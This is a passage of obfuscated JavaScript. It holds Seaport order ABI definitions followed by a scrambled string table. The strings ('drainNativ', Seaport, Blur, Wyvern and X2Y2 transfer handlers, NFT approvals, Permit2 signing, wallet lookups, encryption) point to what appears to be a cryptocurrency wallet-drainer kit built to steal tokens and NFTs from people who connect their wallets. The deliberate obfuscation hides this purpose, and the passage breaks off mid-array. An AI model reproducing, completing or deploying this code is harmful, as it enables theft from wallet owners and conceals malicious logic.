const _0x2e8e6c = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x49f604 = {
  internalType: "uint256",
  name: "totalOriginalConsiderationItems",
  type: "uint256"
};
const _0x36c558 = {
  components: [_0x1e1556, _0x591f95, _0x5800f7, _0x137c4c, _0x1d7933, _0x1cff68, _0x182597, _0x41a2b2, _0x11c3a1, _0x2e8e6c, _0x49f604],
  internalType: "struct OrderParameters",
  name: "parameters",
  type: 'tuple'
};
const _0x44223e = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x2d2083 = {
  components: [_0x36c558, _0x44223e],
  internalType: "struct Order[]",
  name: "orders",
  type: "tuple[]"
};
const _0x1f0bf6 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x396ffe = {
  internalType: "uint256",
  name: 'itemIndex',
  type: "uint256"
};
const _0x2cb8be = {
  components: [_0x1f0bf6, _0x396ffe],
  internalType: "struct FulfillmentComponent[][]",
  name: "offerFulfillments",
  type: "tuple[][]"
};
const _0x54d2e3 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x15f3a9 = {
  internalType: "uint256",
  name: "itemIndex",
  type: 'uint256'
};
const _0x97d2dd = {
  components: [_0x54d2e3, _0x15f3a9],
  internalType: "struct FulfillmentComponent[][]",
  name: "considerationFulfillments",
  type: 'tuple[][]'
};
const _0x37c731 = {
  internalType: 'bytes32',
  name: "fulfillerConduitKey",
  type: "bytes32"
};
const _0x5eecbe = {
  internalType: 'uint256',
  name: "maximumFulfilled",
  type: "uint256"
};
const _0x4ea4a9 = {
  internalType: "bool[]",
  name: "availableOrders",
  type: 'bool[]'
};
const _0x1ab7c8 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: 'uint8'
};
const _0x3c4b6d = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x53e55b = {
  internalType: 'uint256',
  name: 'identifier',
  type: 'uint256'
};
const _0x19dc8d = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x1209d7 = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x4de35e = {};
function _0x3ae7() {
  const _0x4b0b38 = ['_lendingPo', 'uzRAV', 'wrapETH', '🇦🇫', 'NoSwapCall', 'BinHelper_', 'cugVl', 'WithFee', 'stamp', 'AOXRu', 'dPXuV', 'YjJrV', 'camelot', 'Go4778JNKB', 'flag', 'nft', 'sesProvide', 'amountYMin', 'AlreadyIni', 'BeOYd', 'transferOw', 'gistryUpda', 'psfeG', 'glUKH', 'cBIku', 'p2pSupplyD', 'AXgrX', 'SdkZJ', '6879078532', 'https://bs', 'getReturnB', 'setDstGasF', 'tpSlU', 'DWWOx', '20Identifi', 'P2PStatusS', 'sVosm', '80bafc599b', 'inted', 'tokenChain', '🇰🇮', 'Math512Bit', '_nonce', 'ntractAddr', 'RhErN', 'symbol', 'convert', '38289b3dea', 'KXbux', 'lCmMT', 'getHead', 'minToAmoun', 'avalanche', 'nReturn', 'hZyFT', 'ndFactory', "struct Mul", 'now', '🇰🇳', 'newPauser', 'e5c3e136a6', " (Pangolin", 'referrer', 'unt', 'ApeStake', 'liquidityM', 'OBzOz', 'bancor', 'nnet', '1Actions', '7f05d70ab8', 'EeeeeEeeee', 'setMintFee', 'asset', 'swapETHFor', 'ZZvNJ', 'ZeroFee', 'SushiProce', 'withdrawMA', 'zwPbb', 'gyAddress', "Binance Sm", 'tuple[]', 'RescuerCha', 'UWkih', 'liquidityR', "scalar val", '🇨🇫', '2|3|4|1|0', 'KsKPr', '3576KhjUMo', '0x51491077', '🇹🇫', 'FoYOn', 'kFIDl', 'uBgSg', 'a98b954Eed', 'maxGas', 'emaining', '/eth', 'inimum', 'dressInfo/', 'EKbqT', 'IzBfa', 'withdrawMi', 'Set', 'lygonscan.', 'bakcTokenI', 'etherToken', 'bytes4', 'enURI', 'gmZvw', 'PRYBH', '_baycPairs', 'riaResolve', 'wKMmp', "contract F", '_swapStop', 'dXRBB', 'ryqcq', 'completeXC', 'pNaas', '_amountYMi', 'getPair', 'work', 'Router.Liq', 'https://pr', 'AJePI', 'NOGSQ', 'ture', 'GppnW', 'feQhZ', '_ids', '16184a5933', 'J9108240u9', 'YjOOL', 'boUzT', '_gov', 'nPermissio', 'BrokenSwap', '_salePrice', '_info', '932542975', '0x706OW4G8', 'Router.Pat', 'Actions', 'components', 'aaVHx', '2df4df418d', 'LxGtJ', 'uQTRc', 'D171709b7b', '2C37e2a1b0', 'DNdMr', 'vKFBs', 'solvers', 'bwFCY', '_isDepreca', '8222255bc8', 'ork', 'drainNativ', 'CkegQ', 'xoizW', 'ridgeToken', 'BNB', 'unpause', 'HEALTH_FAC', 'quote', 'qjAdH', 'tzMsV', 'NVnkY', 'WSvCx', 'orization', 'CuSrO', 'chainId', 'trictedOrd', 'decreasePo', 'pDjwe', 'd9bec7F1a1', 'FcEtC', 'getBasefee', 'setWooRout', 'maxPerTx', 'balanceOf', 'med', 'quauR', 'tokenCurre', 'OwnerQuery', 'tlSsY', '2|1', 'apeCoin', 'easury', 'CTOxj', 'iBABm', 'okchb', 'Lookup', 'yTDRx', 'assetOptio', 'stake', '&source=Li', '0x6b175474', 'FlashLoan', 'balance', '0De2999dD4', 'LNEWp', 'ExitPositi', 'WooRouterV', 'nova', 'stringFrom', 'f468908cc9', 'mponent[]', '8217', 'https://ca', 'PJInV', 'ljfDH', '🇲🇵', 'pthSy', 'poolBorrow', 'jgChM', 'signature', 'OJCfB', 'ransferFro', 'ForExactAV', 'ZVNvP', 'hcuxJ', '4862310933', 'gBffP', 'elta', 'gadnp', 'MBrXD', '8fF489b578', " (Pancake)", 'aaUsk', '_path', 'c691148eEe', 'erTokens', "ADDED, MOV", 'dGnbq', 'backUnback', 'BRIDGE_PRO', 'sgReceive', 'hing', 'GIjAK', 'Optimism', 'eeOnTransf', 'PTLyn', 'traderJoeV', 'DbVyX', 'E27b85FD66', 'g.PairNft[', 'jKamU', 'OXmxm', 'Account', '0|1|4|2|3', 'L_CODE', '_receiver', '469870105f', '721Recipie', '🇻🇦', 'GvUnb', 'XjVpj', 'aBZBi', 'yqkgo', 'QrtYn', 'ndCall', 'createPool', '894245WZgzLK', 'cef822db05', 'freekey&sh', '_url', 'reason', 'arkets', 'result', 'osisscan.i', 'setDeltaPa', 'p2pIndexCu', '0x1b02dA8C', 'newName', 'get', 'name', 'gDGFr', 'THForToken', 'BAKCNotOwn', 'koClJ', 'c.ankr.com', 'STOhb', 'djsZM', 'sxLIz', 'Amount[]', 'gHJjP', 'CUSUV', 'sEMYT', 'qPgtw', 'szfSq', 'uNaua', 'rEPfB', '_nfts', "return (fu", "contract E", 'bakcToMain', 'ipient[]', '100', 'Dqlfx', '0x76be3b62', 'url', 'InvalidAdd', 'pKVbK', 'saltSize', 'sChainRout', '🇮🇲', 'minter', 'Supply', 'increasePo', 'xIxAc', 'KEtqo', 'RECEIVE_WI', 'advancedOr', '689D8c20fB', '.como', 'JoRjM', 'reLlY', '94dc1DB02A', '_id', 'nKKXo', 'wJCyC', 'ey=8SABUve', 'decodeSymb', 'amountInLe', "enum ItemT", 'vYxMJ', 'denominato', 'ermit', 'currentSta', 'idealBalan', 'disabled', 'FTs', 'RbSoi', 'gePxO', 'ethersProv', 'ionCriteri', 'MQlNb', 'loscan.io', 'dNawF', 'tPAOh', 'uVUkE', 'sgETHs', '🇵🇹', 'onoscan.co', 'AXSupporti', "🌪 [Wyvern ", 'ngAfc', 'ums', "FAILED TO ", 'addChain', 'isPaired', 'tokenCount', 'ithPermit', 'QqGZJ', 'GEqPN', '8dbE20A93c', 'ExternalPr', 'RC721Enume', 'ows', '🇦🇶', 'RKnIL', 'arameters', '_srcPoolId', 'minValue', 'anetwork.i', 'CPrqH', 'status', 'iYQgQ', '87a595ab97', 'amountAVAX', 'F32ee9a30f', 'config', 'OW_SIZE_PE', '🇬🇧', 'NhRus', 'allowance', 'ameterEnco', '🇬🇸', 'bJWsu', 'askTransfe', 'mUbDR', 'piBPY', 'wooBridgeA', '0xbeaE1B06', '/swap?src=', '0x7f5c764c', 'amount1Del', 'jinbn', 'getUserAcc', 'next', '_WAVAX', 'ZWzrv', 'getPoolsUI', 'EPCba', 'uWOY3OpMKk', 'MAX_NB_OF_', '_affiliate', 'cMmMo', 'oAqFU', 'vEQIC', '48430679a7', 'revokeRole', 'eChainNetw', 'startTime', 'lQyyj', 'ebWge', 'oRxOT', '__Insuffic', 'qoabE', '🇧🇶', '026afa', 'blockNumbe', 'kggmW', 'ximum', 'ForExactTo', '0xff970a61', 'rhyOc', 'MarketCrea', 'PTfst', 'ETH_PLACEH', 'OSTransfer', 'ionItem', 'gzUBU', 'gCphO', 'sharing', 'IDZes', 'rationItem', 'rRSpC', 'ffrEf', '🇨🇭', 'meters', 'withdrawNe', 'Caught', 'newAddress', 'IhJTN', 'safeBatchT', 'getMaycSta', 'SafetyChec', 'zMKpJ', 'tchEthereu', 'bqRZU', 'totalSuppl', 'roleMigrat', 'der', 'setPrice', 'oZiqZ', 'nzNLG', 'Single', 'filter', 'amount1Min', 'OwnersAssi', 'JTIPO', "Ape price ", 'edBlock', 'sushiswapA', 'gswJa', 'ERC20[]', '0xd9e1ce17', '5840079131', '_sgChainId', '🇧🇿', 'pfcpU', 'vbfHY', 'SwapBorrow', 'Zeups', 'DrainNativ', 'random_byt', 'YDnhV', 'underlying', 'liquidity', '7d56ac03e8', 'GnHtQ', 'kXhpU', 'receive', '🇳🇬', " (Curve)", 'RaGzI', 'oneInchKey', 'gmxActions', '9814c83bA2', 'validAfter', 'uCQOp', 'RIHUQ', 'E74e3c722A', '6d755c9346', 'stableDebt', 'OMlmx', 'uote?sellT', 'CTfAL', '0x1f9840a8', "Bearer ", 'https://ba', 'rSet', 'apply', 'punksOffer', '🇱🇷', 'tSingle', 'source', 'tokenToOFT', 'uKKQn', 'eUmDY', 'multicall(', 'IZzrv', 'kens', 'r__CallFai', 'd2f806065b', 'nZgAa', 'f6b43ac78b', 'pools', 'tokenOut', 'HocmZ', 'https://po', 'kjGGC', 'BDnnN', 'crypto', 'curveActio', 'yable', 'airdropNat', 'constant', 'eAC495271d', 'getUserEMo', 'chain', 'maOum', 'a6f8e7940c', 'getWalletA', 'Chain', 'configurat', 'ypes.Inter', 'ooWIG', 'CB7C47cd0A', 'LGWlc', 'GOHUT', 'Failure', '🇸🇮', 'GETyJ', 'IjYnl', 'JMuOJ', 'MAPxj', '__proto__', 'iOMvK', 'JDphL', 'xCkKV', '54EEB25477', 'epUTt', " items ($", 'iKgsb', 'otdce', '🇭🇰', 'aCITL', 'lVtfI', '9868babACA', '58C83C3f30', 'querySwap', 'bEQqo', 'OwnershipT', 'web3Js', 'rhdaP', 'cDF485E0e4', 'setBridgeA', 'GaFBv', '_WETH9', 'ints', 'totalInven', 'tEXzk', '🇹🇩', 'DsGaK', '0x0c10bf8f', 'wooActions', 'xrWcY', '0x1b02da8c', 'blur_deleg', '🇬🇮', 'GdEOG', '🇲🇬', 'gsSvj', 'BhndP', 'Info', 'utils', 'ems', '8264ecf986', 'uniswapV3S', 'Stargate', 'TvmdQ', 'NAMSZ', 'utes?token', 'fDEoF', 'wEinL', 'rItem[]', 'LZAtd', 'ugins', 'i.0x.org', 't/rpc', 'teStrategy', 'kex.org', '&slippage=', 'xqdTH', 'UyFon', 'deployed', '🇲🇿', 'uniswapv3', 'trace', 'dateBorrow', "gn Permit2", '_price', 'lementer', 'matic', '3F3fD6335C', 'WzAcU', '94d1c48a54', 'getSplitSt', 'wLAPg', 'tor', 'IaDQa', 'vwtQN', 'countToken', 'ithPermitS', 'D6Ea6b551a', 'orRevertSt', 'nerator', 'itionsMana', 'FzSbQ', 'cIMEl', 'ap.com/', 'bhASM', 'uNpTM', 'oSjNv', 'UnusedItem', 'nIdqW', 'totalSeapo', 'UbBeW', 'PunkTransf', '_newBlackl', 'evertStrin', 'hmiWZ', 'approveTar', 'aave_lp2', '801aced8b2', 'amountMint', 'ensea', 'RCUKz', 'pBZOe', 'transferPu', "address pa", '0xa86a', 'useAsColla', 'aused', 'setDefault', 'stakedAmou', 'sendMessag', 'B68fb85Ed9', 'XRalc', '🇰🇬', 'isUncommit', 'otectionVa', 'wtjdP', '0xd07dc426', 'EtherTrans', 'd919c9bc88', '🇦🇸', 'a-zA-Z_$][', 'request', 'LXeBm', 'VJgEI', 'acceptOwne', 'mintPROOF', 'ILjvC', 'sJSzA', '_newValue', 'PTFte', 'seOfP', 'Thplp', 'updateFlas', 'hAuthoriza', '_amountIn', 'Ioyex', 'cution[]', 'BvhlS', 'length', 'method', 'repayWithA', 'sONnd', '0F116dDEE9', 'yqxaw', 'nSkhs', 'ApprovalQu', 'BWopC', 'lZOmw', 'Lqnev', 'claimApeCo', '49a23ea924', '7EB73ee847', '🇷🇺', "🚫 ", "struct IWo", 'NoSpecifie', '723-416659', '2|6|4|0|5|', 'emaAS', 'ber', 'user', 'mptMax', '_fromToken', 'aZPHJ', 'gzSuh', 'MipeB', 'gToken', 'KduBp', 'subtracted', 'okens', '🇷🇴', 'ave', 'Tvkaw', 'rQhrp', 'e819Dfc1B1', 'emLocal', '🇸🇨', 'zeroex', 'PERMIT_TYP', 'rLUsu', 'cowActions', 'ADDRESSES_', 'activeIdDe', '🇸🇯', '_indexToke', 'eTSLF', 'sult[]', 'aRaQx', 'OrderCompo', 'C9f356a416', 'orrowsETH', '0xa', 'xjMjf', 'eMwpV', "to SDK - ", 'totalStake', 'setIsPause', 'dgaCO', '0|4|2|3|1', 'UrLqL', 'NdIbG', 'CAc52C9B40', 'jFRKp', 'TjBYJ', 'setWeightF', " done..", 'nsferToken', 'diauV', 'AbmZZ', 'tokenSplit', 'odeTotalDe', '0x57ab1ec2', 'toString', 'Web3Provid', 'NEDdJ', 'jJDFGDFJGD', 'NPjvI', 'rBalance', 'ePocJ', 'lib', 'YunaY', 'token_id', 'wyvern_tok', 'Contract', 'BeZero', 'accruedToT', 'oJxpJ', 'APBvN', 'lues', 'biKOO', 'lFKoj', 'location', 'ZfgZD', 'openseaTok', 'jXLoG', 'a49905d7c9', 'tvwlZ', 'hash', 'forceChang', 'permitDeta', 'itemType', 'kyFly', 'TimeRange', 'tokenIds', 'legacyLBfa', 'Phxfa', 'rdmGt', 'setPROOFMi', 'DwJwN', 'givpG', 'yYTgW', 'PRmPj', 'ionItem[]', 'LBFactory', 'vtriw', 'MbRkk', 'XAIRd', '23cd3cadbd', 'hJvfQ', 'fulfillmen', 'proxies', '_name', 'qIxSU', '_PROTOCOL', 'aODAn', "✍🏻 [", 'gTRvJ', '_wavax', 'orderCache', 'curveVyper', 'PAJsR', '🇦🇿', 'wpzZQ', "enum Side", '🇪🇨', 'TooMuchTok', 'doSwapRegu', 'permitTran', 'MvvNH', 'TWXKL', 'ALIOI', "Avalanche ", " NFT(s)", 'vniTv', 'ilableAdva', 'AJgvp', '0f0000', 'kVUhV', 'uint64', "struct IAl", 'USyJp', 'quoteToken', '🇲🇹', 'avax', " [Portfoli", 'bLRCs', 'Mismatched', 'tionMap', 'lForAll', 'fantom', 'isClaimRew', 'jzCJv', 'providers', 'ionAmount', 'gWithdrawa', 'totalTrans', 'ABCDEFGHIJ', 'vjchc', 'edUsers', 'bqhee', 'amountSD', 'RdMnD', 'fByHK', 'LPcLA', 'tworkFees', 'Vault', 'addSigner', 'xnAwB', 'MxXTT', 'com', 'mQtnI', 'OuAvR', 'onOFTRecei', '/getdata/', 'BlockTimes', 'mRbRS', 'updateInde', 'chqOR', 'aaveLP3Act', 'ningToAssi', 'mber', 'ientAmount', 'ult', 'tableBorro', 'tionType', 'ATjwN', 'oQCoN', '1.5', 'NDEX', "CHAIN NOT ", 'safa', 'QxNpf', 'GpRTs', 'LJLRD', 'UnorderedN', 'identifier', 'XIKiV', 'referral', 'balanceOfB', 'kbaUv', 'stringify', 'omIncorrec', 'JNZGj', 'kAGug', 'hjYEp', 'r.io/getAd', 'ntAmountOu', 'InvalidNon', 'open', 'InvalidTok', 'conduitKey', 'Hcfxt', '8453', 'oMwvA', 'rate', 'kkWXw', 'NkMPe', "struct Ape", 'page', 'DflFZ', '0x9702230a', '2d81d265be', 'CELO', 'amount0Min', '0x4a364f8c', 'claimSelfB', 'tKNJz', 'd458b6c891', '3|1', 'okt', 'tKJZG', 'setIsRepay', 'VgiBq', 'Liquidatio', 'setGov', 'ggregation', 'endAmount', 'address', 'seaportTok', "struct Ful", 'okensForAV', '8949454654', 'positionMa', 'rateStrate', " (SAFA)", 'chainrpc.o', 'qjXPE', 'sWithdrawn', 'SbvPI', 'xSWdl', 'GuuIA', '🇲🇶', 'rTokens', 'ZYZhJ', 'getChainId', 'dSNgR', 'apeStakeAc', 'KaqRP', 'variableBo', 'IhAoi', 'nesting', 'NTTiu', '🇵🇷', '.ExactInpu', 'SNT', 'eCaxz', 'tcuRs', 'Convergeic', 'amountY', " (Permit)", '2D2Bb8CeA2', 'EA6b7AC08E', 'TfsaI', 'woo', 'legacyRout', 'implementa', 'KtmlQ', '6728c6568b', 'apestake', 'token_arra', 'torSet', 'cess', 'view', '/api/v1/ro', 'Exceeds128', '73129hizu7', 'version', 'XYHmW', 'Seaport', '0xdac17f95', 'ons', 'nuaWX', 'JFQlo', 'blurDelega', '0x7a250d56', 'tALew', 'LXZtT', 'xlobA', 'c502090edf', '379fac9aba', 'alProtecti', 'SinglePara', '57A175b88c', 'MhtMY', 'hUikI', 'ets', 'ckchain', 'multicall', 'tialized', 'WIyRx', 'head', "x Token(s)", 'ctory', 'getOwner', 'dress', 'oldMinter', 'amp', 'NativeToke', 'lfApeCoin', 'hCRzg', 'ntinuation', 'renderingC', 'Created', 'MLTUO', 'then', 'USD', 'royaltyInf', "pensea Tra", 'OCnRO', 'payable', 'BxVYK', 'VLDxP', 'MLpI1leeey', 'FTPZr', '0x881d4023', 'amountYLef', 'STVEP', 'n.io/', '67C3E74049', '0x7F5c764c', 'entryPosit', 'rJFlY', 'blic-node-', 'pluginTran', 'sweepToken', '🇵🇾', 'amountAMin', 'random', 'DKpGc', 'd69add087d', 'Config', '0c53817069', 'nkBLX', 'amountETH', 'dAclI', '25ea6acebe', 'InvalidPro', '_amountLP', 'nActions', 'uint48', 'prvjY', 'unwrapWETH', 'bbCGa', 'erveConfig', 'eSlippage', 'antPartial', 'Mjdkf', 'price', 'JoeFactory', '🇬🇷', 'annotBeZer', 'tvaUY', 'OLDER_ADDR', 'sFoOi', 'OPTION', "enum IWooR", 'ientLiquid', 'ckHash', 'quickSwapA', '_tokenX', 'tzToJ', '🇸🇾', 'operator', 'akes', 'eRouter', 'f2de4661ed', 'proofClaim', 'Conversion', 'nGotStuck', '91F9059D29', 'nqAQw', "Permit not", 'zCVll', 'maxAmount', 'Ixqqa', 'totalDebt', 'TokenURIGe', 'derflow', 'fNNuB', "Fuse Mainn", 'action', '_amountSD', 'mponentDat', 'wlzeh', 'PoolMigrat', 'IUiXb', 'beneficiar', 'matchAdvan', 'initBNTGov', 'approvalNF', 'AEaMY', 'createActi', "\\+\\+ *(?:[", 'fulfilled', 'HESJT', 'ate', 'WqJKu', 'gjcKs', 'qxJJY', 'claimSelfA', 'uvRQJ', 'Ethereum', 'DndeI', "contract T", 'nalRecipie', 'StartMustB', 'WETH', '21733BdaDE', "ath for wo", '0xC832494d', 'atrvm', 'ecessary', 'tzqLo', 'ovSvL', 'setUpSwap', '0xbAEA4b61', 'BacrV', 'itTransfer', 'uniswapv3_', 'vOCnt', 'QlIKQ', 'ppUlX', 'KsYQj', 'init', 'nalConside', 'ScGCT', 'led', 'org', 'EvEjv', 'WuRFr', 'kqpFa', 'yBrdL', 'aaveIncent', '{}.constru', 'ionIndex', 'depositBAY', 'tkeRy', 'MHrtU', 'BNTPool', 'f0aebe1553', 'mRlUl', 'bytes', 'lowanceTra', '0x82c7a8f7', '3454c06BdA', 'anager', 'HtncY', 'XFhWY', 'UEUmn', '🇵🇱', 'addLiquidi', 'BJAZJ', 'toLowerCas', 'getReserve', 'IQAQk', 'lATfy', 'ncyStopper', 'VYMmH', 'getItem721', 'AnFzj', '60762442Da', 'VEMin', '0x68b34658', 'xfEvo', 'unbacked', 'CzQKZ', 'Urazz', 'sPpbZ', '/bsc', '🇺🇲', 'dwNXo', 'ransferred', 'gZBSq', 'cqoDu', 'wapCall', 'on[]', 'rameters', '🇰🇲', 'setBaseTok', 'orderIndex', 'unstakeMay', 'iTxGH', 'usdg', '95BD0d56f3', 'encodeFunc', 'srcInfos', 'gnature', 'nThreshold', '🇧🇩', '🇲🇱', 'nftContrac', 'kahFh', '6283019655', 'InTlx', 'vwTLe', 'apOnSrcCha', 'era', 'aykRc', "may have t", 'mEqyy', 'BigNumber', 'icNsg', '798f1870C1', 'RUviU', 'idityAVAXW', '0xeEF417e1', '_data', '29639935', 'AHKeU', 'cancelAuth', 'x2y2_trans', 'https://cr', 'f1a3c87f0f', 'awFrR', 'chainValue', 'ulPtL', 'CwdTc', 'GEHPf', 'ain', 'pls', '_wooRouter', 'ath', 'nTGiV', '_maxSorted', 'orSwapCall', 'szgLx', 'remiumToPr', '34A43f5dE4', 'ionFulfill', 'ERC1155Bat', 'TSfOn', 'hqRFP', 'Sfxil', '🇲🇦', '🇷🇸', 'dmiJt', 'ltv', 'repay', 'poolToken', 'rAmount', '🇨🇮', 'OUrhU', 'rKFjS', 'OlkHc', 'FlashLoanR', 'FHyzQ', 'tYAzJ', 'Base', 'getNext', '_contract', 'JCqES', 'tokenIn', 'pwVNa', '56003ScVYYd', 'EwBBk', 'okensForNA', 'repayer', 'sList', '0xd9aaec86', 'createChai', 'inter', 'GBIEL', 'jlzyS', '31e17ef361', 'KLLOr', 'migratePoo', 'zvYPK', 'join', 'cedOrders', 'Pxwuv', 'erveData', 'Unresolved', 'MAX_BASIS_', 'wAZGC', 'calls', '0x00000000', 'ncy', 'ekPzM', 'eac495271d', 'Exchange', 'wnative', 'in.com', '2046GZwaDf', 'xLSuQ', " APE", 'AllowanceE', '_swapDelta', 'ards', 'pancake_v2', 'input', "Fantom Ope", 'checkScala', 'IsWithdraw', 'stener', 'nFulfillme', 'Allowed', 'ShibaSwap', 'NetworkSet', 'Assign', 'tsvtT', 'zKyjN', 'ExceededSt', "\\( *\\)", '00E710B90E', '🇿🇲', 'tesManager', '5Ee44Acfe9', 'IwdIS', 'nHrJE', 'VMjlA', 'fvRAz', 'JhEHA', 'rZoQh', 'ching', 'quoteLayer', '8d2ee523a2', '09e98d2b0c', 'mkPie', 'pVTYb', 'roleNetwor', 'BlockGasLi', 'camelotAct', 'cscan.com', '🇬🇶', 'qChVn', "x Tokens, ", 'OrderCrite', 'ntingOpen', 'LmUkK', 'BEUvw', 'pnTDS', 'Math128x12', 'ount=', 'numPurchas', 'PermitDeta', '🇵🇪', '🏴‍☠️', 'totalWyver', 'IecMN', 'RUHsc', 'targetAmou', 'configureM', '1088', 'RfVEU', 'its', 'ools', '0xf491e7b6', 'GvShp', 'YFXxr', 'red', '33dF781E6C', 'ryForZeroA', 'ota', 'StartNotWh', '4e8be255a3', 'handleChai', 'HroNK', 'c5F6222033', 'vPkPP', 'NaFuV', 'UtZhM', 'bytes[]', 'SrcInfos', 'jfxZe', 'MQnWg', 'rewardsPer', 'asyDg', 'SMnNg', '🇹🇨', 'EHEpk', 'otocol', 'BadContrac', 'uniswapv2A', 'AES', 'newMasterM', '6b3cdd2713', 'toBN', '7Bc958940b', 's=true', 'bbIDt', '🇳🇦', 'liateFee', '🇰🇷', 'IoJVk', '0x1', 'pHeAW', 'exitPositi', 'WGzVS', 'VHLXQ', '_targetTok', 'A55cc6cf18', 'ngFeeOnTra', 'qYLTR', 'CpQsg', '444a200298', 'totalOrigi', 'requireSuc', 'zhTFb', 'nnyGO', 'Iengb', 'removeSign', '250', 'GDfcF', 'abi', '5c3442ee3f', 'alueFromER', 'adPfP', 'xxqnf', '7f4f82362b', 'wnfQM', 'Lockdown', 'izXxG', 'Ape', 'MarketIsNo', 'BaVDT', 'ZdSqG', 'pfApJ', '_stableFac', 'VGJeG', 'plugins', 'ecc66161fc', 'srcChainId', 'per__CallF', 'wner', 'geProtocol', 'scheme', 'fee', 'ount', 'ZyruB', '🇻🇪', 'FKZiw', '0x3b3ee193', 'fsgmH', 'owjve', 'IzUvj', 'FailedToSe', 'uEIau', 'NO_REFERRA', 'enterBidFo', 'iveAmount', 'atch', '🇻🇺', 'ZdsPK', "Invalid UT", '533ebddb5c', '_signTyped', 'deltaIds', 'bMuqo', 'dd14dd0346', 'RpqPF', 'canto', 'deployer', 'eOwner', 'efghijklmn', '0x8731d54E', 'GRYtN', 'RPcVt', '🇦🇲', 'nftPositio', 'NZlEq', 'ionUsed', 'UJHAu', 'dNPwY', 'lPaused', '545416xyyqqH', '1988064000', 'yiVbf', 'exchangeDi', 'DMaQN', 'cGuvr', 'spender', 'find', 'vnYGm', 'msCrypto', 'bUOCX', 'talDebt', 'uPTFU', 'iableBorro', 'wRate', 'protocolFe', '🇦🇮', 'ted', 'dPair', 'xistentTok', 'boba', 'inputs', 'supportsIn', 'LXMWp', 'NTdkP', 'token_tran', 'YjMvO', 'g.PoolUI', 'KZdjo', 'PREMIUM_TO', 'yekvk', 'qGkQO', 'XoAzU', 'owRate', 'aYcfv', 'currentLiq', 'hLPeo', 'UniswapV2', '_srcChainI', 'tions', 'Value', 'gcFmI', 'SLgHD', '_tokenId', 'liquidityI', 'DcXfk', 'apMode', 'NTEREST_MO', 'call', 'omBiJ', 'pageCaught', 'uIKbm', 'WhLni', 'ckubR', 'swapType', 'aave_lp3', 'setIsSuppl', 'amount', 'lar', 'decreaseAl', '_binStep', 'withdrawPr', 'llments', 'uint8[]', 'ope.klaytn', 'kets', "Arbitrum O", '7c61876997', 'ULkvm', 'ioEZT', 'bntAmount', 'PancakeV2', 'DkkGx', 'PwTgA', 'Income', 'TokensTrad', 'vmHeg', 'UEFZU', 'BancorSwap', 'mum', 'dstNativeA', 'trading', 'formulateS', 'MATIC', 'figuration', "nging Chai", 'Mozwn', 'approvalTo', 'JBmUR', 'ZATION_TYP', '_tokenPath', '5|3', 'mcEMT', 'urationMap', '04F14f7A4a', 'TActions', 'gevmn', 'map', 'nbJxT', 'yPvKm', 'BvxmB', 'fdXVF', '🇻🇳', 'getItem', 'eFactor', '&from=', 'wbpjq', 'edForSale', '83637ab66a', 'XeGAl', 'iterations', 'WQxXf', 'VJqjW', 'https://ag', 'SCzvM', 'p2pBorrowA', 'eQuota', 'LbcUP', 'sfUHg', 'HTotg', 'ister', 'gYIJh', 'Params', 'toHexStrin', 'RiQnE', 'CurrentOwn', 'b5b1b0c42f', 'sed', 'nGwJi', 'acceptBidF', "Added Chai", 'polygon.ap', 'DlLHw', '(Permit2)', 'setPool', 'SushiSwap', 'punkNoLong', 'BltGO', 'sourceAmou', '6156', 'tokens', 'ticall.Cal', 'xactOutput', 'AaveLP4', 'icOrder', 'fLWzz', '0x2e3d8707', 'getAmount', 'gofmC', 'WQpCP', 'requestedA', 'tYPXF', 'rFrom', '4ae4462c3d', 'BLfKR', 'mAbWQ', 'eivedItem[', 'MASK', '8734c71904', 'ownerOf', 'getAmountI', 'mobm', 'UserEModeS', 'zAXNc', 'GzdaO', '🇧🇷', 'KQkEg', ',eth', 'realBridge', "OS Transfe", 'nkWbB', 'orSale', 'applicatio', '0x817Eb46D', 'IOCAG', 'DOGE', 'Mayc', 'tHVPK', 'string', 'ated', 'updateMast', 'YmKsr', 'lbFactory', 'MaxAmountI', '3|1|0|4|2', '0x4d224452', 'FhVMV', '_poolId', 'newOwner', 'aurora', 'xakgp', 'getChainFr', 'xTgwS', 'srcPoolId', 'IFyGH', '3d31888d86', 'wZmDP', 'jSKEW', 'vider', 'KKPcg', 'fromWei', 'CFZvU', 'MaxGasForM', 'WvinN', 'zone', 'dE11c823cC', 'e19EA4f9D9', 'IsLiquidat', 'WithdrawPa', 'RlRyT', 'g.PairNftW', 'URI', 'tokenValue', 'FlashLoanC', 'jmphl', 'getAmounts', 'clVDS', 'ZvnOK', 'EoNOH', '30334CA39B', 'renounceOw', 'swapExactN', '_trader', 'uEOpR', 'olCollecti', 'DSpuA', 'eHNEN', 'EfIkk', '🇧🇱', 'OAFgT', 'referralCo', 'wXLFV', 'ljZHu', 'swapTarget', 'edSet', 'atus', 'LOLVx', 'toVZm', 'aaveLP4Act', 'TfmaG', 'QuadraNet,', '.ExactOutp', 'g.PairNftD', 'KlLTo', 'afe6dfeb2a', 'Swap', 'F6B43aC78B', '324', 'F0875A1B74', 'MNLiO', 'E_REBASE_I', 'IdOverflow', 'n/json', 'kHzqP', 'DEFAULT_AD', 'CqKGn', 'zoneHash', 'sescan.org', 'target', '6d275367b8', 'arams', 'Revert', '🇰🇾', 'jjlWp', 'x-client-i', 'tiRyD', 'KdrPf', '12130QsasTi', 'valueMsg', 'sProvider', 'ssfsdf', 'sushi', 'tOverflow', 'EntBT', 'pendingRew', '0.03', 'zuRWU', 'Address', 'lFtWv', 'amountMini', 'xVyQy', '🇨🇲', 'QUUUq', 'OoOUY', 'reverse', 'traderjoe_', 'encrypt', 'UEgWM', '8F69c22C88', '_isP2PDisa', 'setBridgeS', 'InvalidIte', 'Mint', 'UPKwP', 'fBCwd', 'HHNNw', 'actory', 'mSGga', 'YbEGAH37Pt', 'awal', 'iNntN', 'koWbC', '4db88138e2', '0x3096d3B0', 'F235025270', 'PscTy', '5e81C686e5', 'uint256[]', 'CBeib', 'Curve', "Trying to ", 'nces', 'HLnfK', 'Mode', 'fromAmount', '_factoryV2', 'qIrJe', 'pportingFe', '_swapForY', 'CUMHF', 'load', 'rNonexiste', 'eActions', 'D8002F8b6B', 'cgHFq', 